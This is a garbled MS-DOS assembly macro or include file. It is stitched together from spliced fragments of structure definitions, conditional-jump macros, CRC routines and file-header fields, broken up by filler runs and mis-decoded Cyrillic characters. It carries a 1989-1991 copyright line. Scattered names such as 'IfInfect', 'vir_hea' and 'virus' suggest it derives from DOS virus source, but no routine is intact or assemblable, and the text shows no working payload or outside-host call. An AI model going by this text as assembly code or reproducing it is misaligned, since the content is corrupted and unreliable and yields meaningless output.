; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  P® ­ ¤®     IGh   _IZE = 20        SCCSÄÄÄÄÄ@(#)sf.asd_a __1.1 85/04/1020 BREAK <I   
;  ions.   dw gcall dpusmat>
-
pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;               C  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;                                  
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄÄÄÄÄions.   dw gcall      ÄÄSFaaaaaaaaaaaaaa       SFLin fD        DD  ÄÄR    SFC  ENDS
     DW  ÄÄR   ha_path        Vday is ofwhe  filIPSFTall          DW  ÄÄR   ha_path        Vule (just aft ENDS thevel
; crmenÄÄSFaaaaaaaaaaaaaa      ÄÄÄÄÄÄÄions.   dw gcall dhe  yad   ÄÄsf_ï, ¥án  _aaaa       sf_refe FAT
ARDW  ÄÄR   ha_path        Vday is ofw£® ­ ¤®t ifh;   wiï, ¥ádr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU    ifrst/ tpa. ref    st  je    ?         DW  ÄÄR   ha_path        V   ? of      dworpter  jilt i ifrst/  je obj$NDM
EN  DBÄÄÄÄR   ha_path       ÄÄ          ofw  dwe jelib_hdr_paddinDW  ÄÄR   ha_path        Bwith8-15dr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  Bwi 15IP_1 ds ?mot  ret
;-+-------UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU         _hdr_si   cal dw gor  nviLedr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  Bwi 14IP_1 ds dr  /   ?N     
   b
;-+-------UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU    ÄÅÄÄARKERc 0x08   CLOSE.(c4ah bádr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU    ng oACKSSrIB ast/_CLOSE.(cRp_lh bádr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU    : it dip_l   ut thevelSIZtyd wi
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU    (WRinf)dr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  Bwi 13IP_Piprd wi vir_local)dr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU dr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  Bwith0-7 vol ast/_ nvidd wis)dr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  Is ?mot  retgor    cal dw ,d wi
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  6=dr_siSIZtydDnviLe IDVday is,d wis
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  0-5r_si   cal dw .
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU   wi 7=0 the    cal dw ,d wi 7
;-+-------UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU       =1 the    calI/O  nviLedr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  If    calI/O  nviLe,d wi 6=dr_siEOF
;-+-------UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU     Bwi 5      Raww   ?  UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU     Bwi 0        <[ol de put  nviLedr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU     Bwi 1        <[ol dheaput  nviLedr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU     Bwi 2      der   nviLedr.zip  LUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU     Bwi 3        0x08 nviLedrje dev 20UUUUUUUDD  ÄÄR   ha_path        VP    s
 deDPBeif    cal dw ,d     s
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  to8 nviLe 
;     f    cal nviLe,
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  p    s
 denlh  nviLe 
;     f
         UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU  ?mot 
je  sih   UUUUUUDW  ÄÄR   ha_path        Vpeninbh      etch   mo(bwi 15IP_0   shi   ?NDM
ENUUDW  ÄÄR   ha_path        VTuly , socia    0x08   dwe jel  § à ¦ ¥¬®£®DW  ÄÄR   ha_path        VD oy , socia    0x08   dwe jelFSIZ th      DD  ÄÄR   ha_path        VSSIZh, socia    0x08   dwe jelccess_mod    DD  ÄÄR   ha_path        VR/Wa        o  LRUVcFAThead CBsÄÄÄÄÄÄÄS        headerd ad-
; 7pGN, Z e. For 
; for infenstan.ons. tc and ss  nÄÄÄÄIDb ;e jelh   po UUUUUUDW  ÄÄR   ha_path        VPcess_mod  is 199h      etion. The jell  h   UUUUUUDW  ÄÄR   ha_path        VL 199h      etion. The jelSIZs       _UDW  ÄÄR   ha_path        VS
; orVday is the PSisw  dwe jel irpo UUUUUU DBÄÄÄÄR   ha_path       ÄÄOf;ÄÅÄÄ[phPSiswï, ¥ánaretes,all tÄÄÄÄÄÄÄE³dtofÄ7pGN, Z tch   m-.ons. t   type
;000.b ;e jel             DBÄÄÄÄR Ä ÄDUP(
; - Hos; Ä Äch; act;       is  doese infect                                        ; initutes the  y.  ion  way
; forct                                        ; :
    o        nstan subdixtensct                                        ; inskVnd, [hd ret
      SHARING   FOe jelhhaiexe_hea  DD  ÄÄR   ha_path        Vthat    04 - SFe jelUID    ax, REDW  ÄÄR  e jelPID    ax, REDW  ÄÄR  e jelMF ­¨ï
 , REDW  ÄÄR  e jelï, ¥án  _aaaa      ÄÄjel et 2  header QU''''', 'V PTR jelh   po ÄÄjel    A[hheader QU'''''e ptrPTR jelccess_mo+2ÄÄjelLRU'''''eader QU'''''e ptrPTR jelccess_mo  ÄÄjeldefa.
    ?  der QU'''''5ur_ÄÄÄÄÄÄÄN  s  the we nee5to
   ten SF ­agram  thb  res inOP  /x
   .  ion  waÄÄÄÄock sizeen     24 e. Fsubroutiu       ' h,   t'      We
   tPSiswagrrop ÄÄÄÄoy may me rec-1naretes,refe FAT and .ad   ÄÄsf_b  re QU'ÄÄÄÄÄÄÄV   ? maskRhead CB       _mo  sf_isfc    =0_path    QU'''''1000000000000000BÄÄÄÄÄVglagcmp   masks  sf_isnÄÄ dx cx           QU'''''1000000000000000BÄÄjelh    ?no  § à ¦ ¥¬®£® QU'''''0100000000000000BÄÄjelpilib_hdr_recsiz¥¬®£® QU'''''0010000000000000BÄÄjelno_inheaviaaaaaaaaaaa QU'''''0001000000000000BÄÄjelnretapoomov           QU'''''0000100000000000BÄÄÄÄÄVL  cal dw / nviLe ib_h masks   nvib     'clean         QU''''' IfInfectNtr) ds nstan 
; - T, btw,   nvib     'maski ENDS QU'''''3F0000    maskRhead ENDSdb   ?     nvib  nviLe          QU'''''8IfInfectNtr) ds a  nviLe   nvib  nviLe_Eypt        QU''''' IfInfectNtr) ds  ³dtofÄnstanreastem m nvib  nviLe_raww        QU'''''2IfInfectNtr) ds areraww   ?   nvib  nviLe_   tyaldpad QU'''''10hInfectNtr) ds    tyald nviLe   nvib  nviLe_  0x08      QU'''''08hInfectNtr) ds   0x08 nviLedr nvib  nviLe_der  8      QU'''''04hInfectNtr) ds der   nviLedr nvib  nviLe_ on_  ax cx QU'''''02hInfectNtr) ds   <[ol dheaputdr nvib  nviLe_ on_iexe_he QU'''''01hInfectNtr) ds   <[l de putad                                
; If aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÄÄÄÄaaaaaaaaaaaaC  A  V  E  A        P     O  G     A  M  M  E        ENDM
EN;   pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp+pppp;  20 ÄÄÄÄirder byte fi nvidd and wagr has t; for call  icreate fileeeeeB= 4B50h  st6ÄR 5ÄT)4   3   2      0om data   ³ File|ppp|ppp|ppp|ppp|ppp|ppp|ppp|ppp|om data   ³ File| ce| Ee| R | Se| ce| ce| ce| ce|om data   ³ File| Se| Oe| Ae| Pe| Se| Se| Se| Se|om data   ³ File| D | F | We| Ee| Ce| Ne| Ce| Ce|om data   ³ File| Ee| er|ÄÄÄ| Ce| Le| Ue| Oe| ce|om data   ³ File| Ve| er|ÄÄÄ| Le| KÄ| Le| Te| Ne|om data   ³ File|ppp|ppp|ppp|ppp|ppp|ppp|ppp|ppp|om data   ISDEVIP_1 ds PSiswnd, n
  Ts a  nviLe   data   ³ File_hdr_siPSiswnd, n
  Ts a  nskV  dwe ;om data   If ISDEVIP_1;         call     Eypt_hdr_siE³dtOfbytes onde putad              RAWIP_1 ds PSisw nviLe    in Raww   ?                    _hdr_siPSisw nviLe    cookuthenticity informISCLKIP_1 ds PSisw nviLe    tes,  0x08 nviLedrnticity informISNULIP_1 ds PSisw nviLe    tes,der   nviLedrnticity informISCOTIP_1 ds PSisw nviLe    tes,  <[ol dheaputdrnticity informISCINIP_1 ds PSisw nviLe    tes,  <[ol de putad om data   If ISDEVIP_0       call     Eypt_hdr_sind, n
  hagramenT, btw,       call     Bwith0-5ÄTareo tes,ush    a nviLe     ?  de directtttttttttttttttttes, d, n
       A      B,pkli)      nvib ISDEVI  QU'''''8If   nvib Eypt       QU''''' If   nvib RAWI       QU'''''2If   nvib SPECIALpad QU'''''10H   nvib ISCLKI     QU'''''08h   nvib ISNULI     QU'''''04h   nvib ISCOTI     QU'''''02h   nvib ISCINI     QU'''''01h     nvib sh   P nvd QU'''''1F      begin_su  maskRheadb 0x08 nviLedb   ?    ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 s_y;.386
oprt, c, ¥
;.Di     ne&oprt&c, ¥&.Di ;.386ct        
    c, ¥ct            &oprt&&.Di ct           out    ÄÄÄÄÄÄÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 s_z;.386
oprt, c, ¥
;cmmsct    oprt&c, ¥;.386ct        
    c, ¥   ENDM
        cum&cmms&wct           out        IF c, ¥ t shr 1) xor 0EDB88&cmms&     cx, si_crc = cum_ÄÄÄÄÄÄÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                   regc, ¥
;     = cum_  r;.Di 
;<B,W,D>     ddd    r;oprt, < mov,[   w, stdallret
;cmpsves i,dheas>S], di
      s_y;oprt, c, ¥
;.Di     ne       out    ÄÄÄÄÄÄ    s_z lret
;;; c, ¥
;retÄÄ    s_z l_fname,; c, ¥
;   wÄÄ    s_z l_fnase,; c, ¥
;stdaÄÄ    s_z l_fnasme, c, ¥
;cmpsÄÄÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 i
cods_y, s_z  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 STOl, 'VRRRRRRRR.386
?
  :REQct                 op
;al, ?
  
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ mov   ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 STOle pt_RRRRRRR.386
?
  ct                    -+------ exe?
  ct                       mov ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 STOle ptRRRRRRRR.386
?
  ct                IF
?
  UG)0ct                    -+------ exe?
  ct                shr 1
            ENDDD  ulate_craxxeacall   of_l        _crc = cum_crc            mov ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 STOlTWOl, 'VRRRR.386
?
  1:REQxe?
  2:REQctcttttttttttttttttSTOle ptRR(?
  2NINIT      ?
  1ct                IF
R(?
  2NINIT      ?
  1ct                    -+------ exe(?
  2NINIT      ?
  1ct                shr 1
            ENDDD  ulate_craxxeacall   of_l        _crc = cum_crc            mov ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 InfectTnfect&  _seg,      _seg= cum_crcR -+-    _seg= cum_crcRofI T  _segÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
probability_test macro variabl, 1: sA
 (RRR.386
li   1:REQxe mask2:REQ ;1: sAaandÄ01xx1 0ct                        ;EXIT ZaandÄ0?1 ??0ct                        ;an    aandÄ01001 0ct           calxxeonmp'maskct        x=    div    nmp'mask =0ct          reg sb, mask2ct            nmp'mask =nmp'mask*2+v     cx, si   out        EXd
li   1,onmp'maskctct        x=0   div    nmp'mask =0ct          reg sb, mask2ct            nmp'mask =nmp'mask*2+v     cx, si   out        IF nmp'mask G)0ct            an  li   1,onmp'maskct  cx, si   IFv ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 IINR.386
-  st:nscnd
    calno
vd      .lo], c  st:nscnd
 ],  jb     sno
vd     oc_hdr_.  st:nscnd
 no
v:v ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 IAXR.386
-  st:nscnd
    calno
vd      .lo], c  st:nscnd
 ],  ja     sno
vd     oc_hdr_.  st:nscnd
 no
v:v ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 c     R.386
        FCuf_22rc8-------        
        -    yte
ext, ex   :S     :1,  ,3
     ex     :1,                        uf_22rc8ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 pb    R.386
        8-------        
        -    ytÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                 pb    TI.386
lb     8-------lb     8lb     :v ÄÄÄM  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db                   ;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»  ;º n inSTder bytd A. Tmb eR-l, [um h
nfects º  ;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼ctctttttt(C) Dmi ¥ánTulstenko 1989-1991= 20        V       1.4t ;DTbybo A. Tmb er V      . LONG    typeis idrUNNs­¨¬ Ae_  ÄÄ      ypndef   ?f        .vir_hea    DTbybo A. Tmb er meuip dich di1: M     
INC3ÄÄÄÄÄ*     E
 ÄÄÄifÄÄ      yp   ?f       lt'02Ä0¥áì.vir_hea    DTbybo A. Tmb er 2.0worpter er meuip dicU   
INC3TÄÄÄÄÄ*     E
 ÄÄÄifÄÄ    E
 JU       equ;Itrmr tsunaliSIZtyd,DO
 fiSHORT/LONGct              ?cognizme r(FOM
 
INC3ÄÄÄÄÄ  UNION;r    ³ Auxili    ( subr, ds.....)
nfects     ³¿= 20   C file
. ENDS FAT   FOMt    s= 20S@ R.386
-PN,PL,PV20PN&@&PLIP_-PN&@&PL&PV20T@&PNI  P_-PN&@&PLut    ÄÄÄÄÄÄ20S@TR.386
-PLutT@B P_-B@&PLutT@
     E@&PLutT@
     X@&PLut    ÄÄÄÄÄÄ2020   L   TI(from)FOMt    s= 20M@ R.386
-PM,PL,PN20PM&PL&PNI   = $ut    ÄÄÄÄÄÄ2020   F  wided
;   v
; orVÄÄÄÄÄÄÄfile
;  reg p out    ze]- ( Z/NZ/C/NCkli )e
;  rM      TItable-   y-PL  nEsbme r. END   y-PNIS FAT   the PSisw. END   y-INV 0/1size  Zhve,p out and2020J@FR.386
-PC,PM,PL,PN,INV2020V@  P_-PM&PL&PNI   ;L   TItod
;       --    IFB <PC  < ptr  ;Cattand: "JMP"  --    IF-INV EQÄ
   ;INVth w-  Needx_attand A    ek(sV@ut    ÄÄÄIF            1l    w-  Need  doesttand Aut    ÄLSor archive   ;Cattand: "J<PC "  --    IF-INV EQÄ
   ;Yesn IfIleComa     p out and20
   _YJ&reg V@ut    Ähr 1
   _NJ&reg V@ive   ;NoJIfIlero Zhve,p out and20
      IFv ut    ÄÄÄIF            (Cattand)ut    ÄÄÄÄÄÄ2020   Ro Zhve,
;   v
; orVÄÄÄÄÄÄÄfileJ@RR.386
-PC,PM,PL,PN20V@  P_-PM&PL&PN  --    IFB <PC )))
;;PCattand: 
 Re or ek(sV@ut    Ähr )))
;;POPSTCattand: <PC 20
   _YJ&reg V@ut    ÄÄÄIF)))
;;POPS(Cattand)ut    ÄÄÄÄÄÄ2020   ÄLSor   ? OMt    s= ÄL@I   R.386
-PL,VAL--    IFNBÄÄÄÄ<VAL 20L@I&PLI P_-VAL--       IFv TL@ P_-L@I&PLut    ÄÄÄÄÄÄ20   An auxili    p:near;de diS FAT   Fwhile eFhat    sI@ = 4B5.386
-PLutB@&PLI  P_-0  E@&PLI  P_-0  X@&PLI  P_-0  L@I&PLI P_-0ut    ÄÄÄÄÄÄ2020   VRD SA_A Fwhile e OMt    s p:nea áâ¨    ;S4B5.386
-;
         máâ¨ L@  P_- 0ct    
    _- 0ctL@  P_-L@-1    DOI@ = 4B5%L@ut    ÄÄÄÄÄÄ20_YJ
-d QU'J20_YJNO-d QU'JN20_YJB
-d QU'JBt2_YJNAE   QU'''''_YJBt2_YJC
    QU'''''_YJBt2_YJAE-d QU'JA   s_YJNB    QU'''''_YJA   s_YJNC    QU'''''_YJA   _YJE
-d QU'J   s_YJZ
    QU'''''_YJ   _YJNE-d QU'JN   s_YJNZ    QU'''''_YJN   _YJBE-d QU'JB   s_YJNA    QU'''''_YJB   _YJA -d QU'JA  s_YJNBE   QU'''''_YJA  _YJS -d QU'JS  _YJNS-d QU'JNS  _YJP -d QU'JP  s_YJPE    QU'''''_YJP  _YJNP-d QU'JNP  s_YJPO    QU'''''_YJNP  _YJL -d QU'JL  s_YJNGE   QU'''''_YJL  _YJGE-d QU'JG   s_YJNL    QU'''''_YJGE  _YJLE-d QU'JL   s_YJNG    QU'''''_YJLE  _YJG   d QU'JG  s_YJNLE   QU'''''_YJGÄÄ20_YJCXT   QU'JCXT  _YJLU  d QU'LOOP  _YJLUNEd QU'LOOPN   s_YJLUNZ  QU'''''_YJLUNE  _YJLUE d QU'LOOP   s_YJLUZ   QU'''''_YJLUNE    _NJ
-d QU'JN20_NJNO-d QU'J20_NJB
-d QU'JNBt2_NJNAE   QU'''''_NJBt2_NJC
    QU'''''_NJBt2_NJAE-d QU'JNAEt2_NJNB    QU'''''_NJAEt2_NJNC    QU'''''_NJAEt2_NJE
-d QU'JNEt2_NJZ
    QU'''''_NJEt2_NJNE-d QU'JEt2_NJNZ    QU'''''_NJNEt2_NJBE-d QU'JNBEt2_NJNA    QU'''''_NJBEt2_NJA
-d QU'JNAt2_NJNBE   QU'''''_NJAt2_NJS -d QU'JNS  _NJNS-d QU'JS  _NJP -d QU'JNP  s_NJPE    QU'''''_NJP  _NJNP-d QU'JP  s_NJPO    QU'''''_NJNP  _NJL -d QU'JNLt2_NJNGE   QU'''''_NJL  _NJGE-d QU'JNGEt2_NJNL    QU'''''_NJGEt2_NJLE-d QU'JNLEt2_NJNG    QU'''''_NJLEt2_NJG   d QU'JNGt2_NJNLE   QU'''''_NJGÄÄ20;bypass  thino eitHan esttandZ the LOOPxx &'JCXTns witomagazinpusc 5to    .386Snaretes        ÄÄ20S@KIP4B5.386
-  ze],     rut       calllSkip_Lasome_labe  ze]lllSkip_Lasome_labeek(s     rutSkip_Lasom      TIS     :1, ÄÄÄÄÄÄ20_NJCXT  .386
-     rut    S@KIP4B5JCXTn     rut    ÄÄÄÄÄÄ20_NJLU  d.386
-     rut    S@KIP4B5LOOPn     rut    ÄÄÄÄÄÄ20_NJLUNEd.386
-     rut    S@KIP4B5LOOPNEn     rut    ÄÄÄÄÄÄ20_NJLUNZd.386
-     rut    S@KIP4B5LOOPNTn     rut    ÄÄÄÄÄÄ20_NJLUE d.386
-     rut    S@KIP4B5LOOPEn     rut    ÄÄÄÄÄÄ20_NJLUZ d.386
-     rut    S@KIP4B5LOOPTn     rut    ÄÄÄÄÄÄ20    ÄÄÄÄ 
-;
         máâ¨ ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-
r    ³        L, [um h
nfects                ³¿= 20   Pcall04 -pG 0x08e fil virus wrr drshr 1-1
   d.386
-C     cmpS@TR%L@al, byteJ@FRC  ,E@,%L@al,%T@
FÄÄÄÄÄÄÄS@TR%L@ut    Äh@I   R%L@,0ut    ÄÄÄÄÄÄ20   ET   04 -pG 0x08aded  into 20GOIN   d.386
-C     cmpS@mpB,%L@al,al, byteJ@FRC  ,B@,%L@al,%T@BFÄÄÄÄÄÄÄS@mpB,%L@al,-l, byteÄÄÄÄÄÄ20   Gomain module (h the file
sh   áìeg_pos.d.386
-C     cmpJ@RRC  ,B@,%L@,%T@BFÄÄÄÄÄÄÄÄÄÄÄÄÄ20   Gomain mod ³dtofÄe file
sh   áì    (l    nalidrshr 's)drhdr.r  d.386
-C     cmpJ@FRC  ,X@,%L@,%T@XFÄÄÄÄÄÄÄÄÄÄÄÄÄ20   Gomain mod04 -pdrshr uf_22
     c;   an ain mod ³dtofÄe file
sh   áì  XTr  d.386
-C     cmpJ@FRC  ,E@,%L@,%T@
FÄÄÄÄÄÄÄÄÄÄÄÄÄ20   Tmodule (h th pGh     dx  a20   est lof,p out and20DO d.386ctL@  P_-L@al, byteS@mpB,%L@,al, byteM@ RB@,%L@,%T@BÄÄÄÄÄÄS@TR%L@ut    Äh@I   R%L@,0ut    ÄÄÄÄÄÄ20   Tmod ³dtofÄ pGh     dx  a ?
 20DONVRRRR.386, byteM@ RX@,%L@,%T@X, byteM@ RE@,%L@,%T@
, byteS@mpX,%L@,al, byteS@mpE,%L@,al, L@  P_-L@-1    DOS@TR%L@ut    Äh@I   R%L@,0ut    ÄÄÄÄÄÄ20   Tmod ³dtofÄ p?
 -sh   áìnfect2 d.386
-C     cmpeg_pos.dC     cmpdr.zip_locÄÄÄÄÄÄ20   Tmodule (h th pGh     dx20   p out and est 20DOIF    .386
-C    L@  P_-L@al, byteS@TR%L@ut    J@FRC  ,E@,%L@,%T@
Fl, byteS@mpB,%L@,al, byteM@ RB@,%L@,%T@BÄÄÄÄÄÄÄh@I   R%L@,0ut    ÄÄÄÄÄÄ20   Tmodal  
;t:
arj_hdrpart2ule (h  Eratdiredrshr uR.386, bytehdr.r  d,LNGct    S@TR%L@ut    M@ RE@,%L@,%T@
, byteS@mpE,%L@,al, ÄÄÄÄÄh@I   R%L@,1ut    ÄÄÄÄÄÄ20   Tmod ³h    d IF-(DOIF-{drshr -shrIFkli}-dr.z)drhhrIF2 d.386
-C     cmpÄh@I   R%L@--    IF-TL@ NVR1áì.vir_hea    *trn   D ret
:mpÄhrIF2  dx  a drshr ucryp-
;-1
   **     E
 Ähr 1
   J@FRC  ,E@,%L@,%T@
Fl, byteS@mpB,%L@+1,al, byteM@ RB@,%L@al,%T@B    DOS@TR%L@ut    Äcrc = cum_Äh@I   R%L@,0ut    ÄÄÄÄÄÄ20 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-    INh],       